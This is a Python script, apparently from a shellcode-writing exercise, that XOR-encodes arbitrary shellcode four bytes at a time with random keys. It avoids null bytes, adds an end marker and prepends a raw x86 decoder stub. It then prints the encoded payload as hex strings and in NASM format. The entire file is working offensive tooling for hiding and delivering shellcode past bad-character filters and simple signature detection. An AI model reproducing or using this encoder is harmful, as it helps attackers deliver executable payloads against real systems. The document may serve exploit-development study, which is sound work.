#!/usr/bin/python

import random
import socket
import struct
import sys

# Decoder stub
decoder_stub = "\xeb\x57\x31\xc0\x31\xdb\x31\xc9"
decoder_stub += "\x31\xd2\x5e\xbf\x90\x90\xaa\xaa"
decoder_stub += "\x83\xec\x7f\x83\xec\x7f\x83\xec"
decoder_stub += "\x7f\x83\xec\x7f\x8a\x5c\x16\x01"
decoder_stub += "\x8a\x7c\x16\x02\x8a\x4c\x16\x03"
decoder_stub += "\x8a\x6c\x16\x04\x32\x1c\x16\x32"
decoder_stub += "\x3c\x16\x32\x0c\x16\x32\x2c\x16"
decoder_stub += "\x88\x2c\x04\x88\x4c\x04\x01\x88"
decoder_stub += "\x7c\x04\x02\x88\x5c\x04\x03\x39"
decoder_stub += "\x7c\x16\x05\x74\x0a\x42\x42\x42"
decoder_stub += "\x42\x42\x83\xc0\x04\x75\xc5\xff"
decoder_stub += "\xe4\xe8\xa4\xff\xff\xff"

# Seed PRNG (don't use this for real crypto)
random.seed()

if len(sys.argv) < 2:
	print('Usage: {name} [shellcode_file]'.format(name = sys.argv[0]))
	exit(1)

shellcode_file = sys.argv[1]

# Read shellcode from file in '\xFF\xEE\xDD' format
with open(shellcode_file) as f:
	shellcode_original = bytearray.fromhex(f.read().strip().replace('\\x',''))

# If shellcode is not 4 bytes aligned, adding padding bytes at the end
if len(shellcode_original) % 4 != 0:
	padding = 4 - (len(shellcode_original) % 4)
else:
	padding = 0
if padding:
	print('[+] Shellcode not 4 bytes aligned, adding {} \\x90 bytes of padding...'.format(padding))
	for i in range(0, padding):
		shellcode_original.append(0x90)

shellcode_encoded = bytearray()

# Process 4 bytes at a time
for i in range(0, len(shellcode_original), 4):
	xor_byte_good = False
	while(xor_byte_good == False):
		# Generate random XOR byte
		r = random.randint(1,255)
		# Check that resulting shellcode doesn't contain null bytes
		if (r ^ shellcode_original[i] != 0) and (r ^ shellcode_original[i+1] != 0) and (r ^ shellcode_original[i+2] != 0) and (r ^ shellcode_original[i+3] != 0):
			xor_byte_good = True

	# Encoded shellcode contains XOR byte + next 4 bytes reversed	
	shellcode_encoded.append(r)
	shellcode_encoded.append(shellcode_original[i+3] ^ r)
	shellcode_encoded.append(shellcode_original[i+2] ^ r)
	shellcode_encoded.append(shellcode_original[i+1] ^ r)
	shellcode_encoded.append(shellcode_original[i] ^ r)

# Add end of shellcode marker
shellcode_encoded.append(0x90)
shellcode_encoded.append(0x90)
shellcode_encoded.append(0xaa)
shellcode_encoded.append(0xaa)

# Print out the output
decoder_stub_hex = ''.join('\\x{}'.format(hex(ord(x))[2:]) for x in decoder_stub)
shellcode_original_hex = ''.join('\\x{:02x}'.format(x) for x in shellcode_original)
shellcode_encoded_hex = ''.join('\\x{:02x}'.format(x) for x in shellcode_encoded)
shellcode_encoded_nasm = ''.join('0x{:02x},'.format(x) for x in shellcode_encoded).rstrip(',')
print('[+] Original shellcode (len: {}): {}\n'.format(len(shellcode_original), shellcode_original_hex))
print('[+] Encoded shellcode (len: {}): {}\n'.format(len(shellcode_encoded), shellcode_encoded_hex))
print('[+] Encoded shell in NASM format: {}\n'.format(shellcode_encoded_nasm))
print('[+] Encoded shellcode /w decoder stub (len: {}): {}\n'.format(len(decoder_stub) + len(shellcode_encoded), decoder_stub_hex + shellcode_encoded_hex))
